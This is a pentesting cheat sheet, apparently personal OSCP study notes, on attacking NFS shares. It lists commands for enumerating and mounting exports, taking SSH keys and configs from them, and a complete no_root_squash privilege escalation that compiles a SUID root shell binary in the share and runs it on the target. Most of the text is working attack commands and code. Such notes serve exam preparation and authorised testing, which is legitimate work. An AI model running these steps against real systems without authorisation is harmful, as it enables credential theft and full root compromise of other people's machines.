# NFS (2049)

## Up
- [[Services]]

NFS shares directories over the network. Wins: **readable exports** (SSH keys, configs, flags) and the classic **`no_root_squash` → local root** privilege escalation.

---

## Enumerate

```bash
nmap -p111,2049 -sC -sV $IP
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p111,2049 $IP
showmount -e $IP                        # list exports (the key command)
rpcinfo -p $IP                          # confirm mountd/nfs
```

---

## Foothold / Loot

```bash
mkdir /mnt/nfs && sudo mount -t nfs $IP:/export /mnt/nfs -o nolock
ls -la /mnt/nfs                          # SSH keys? configs? user.txt?
# grab an id_rsa → ssh in ([[SSH (22)]]); read configs for creds
```

---

## Privilege Escalation: `no_root_squash`

If an export has **`no_root_squash`**, files you create as root on your box are root on the target → drop a **SUID root shell**:

```bash
# on attacker (as root): mount the export
sudo mount -t nfs $IP:/export /mnt/nfs

# create a root-owned SUID binary in the share
cat > /mnt/nfs/x.c <<'EOF'
int main(){ setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc /mnt/nfs/x.c -o /mnt/nfs/x -w
chmod +s /mnt/nfs/x           # set SUID as root

# on the TARGET (as your low-priv user):
/export/x                      # runs as root → root shell
```

(Alternatively copy `/bin/bash` into the share and `chmod +s` it.)

---

## Common Misconfigurations

- **`no_root_squash`** on an export → root-equivalent file creation → local root.
- **World-readable/writable exports** → key/config theft or payload drop.
- Exports mountable **without authentication** (`*` in `/etc/exports`).

---

## OSCP Tips

- `showmount -e $IP` is the one-liner that reveals everything.
- Check `/etc/exports` on the box (once you have a shell) for **`no_root_squash`** — a reliable Linux privesc.
- Readable exports often contain **SSH keys** → instant [[SSH (22)]] foothold, or **flags** directly.
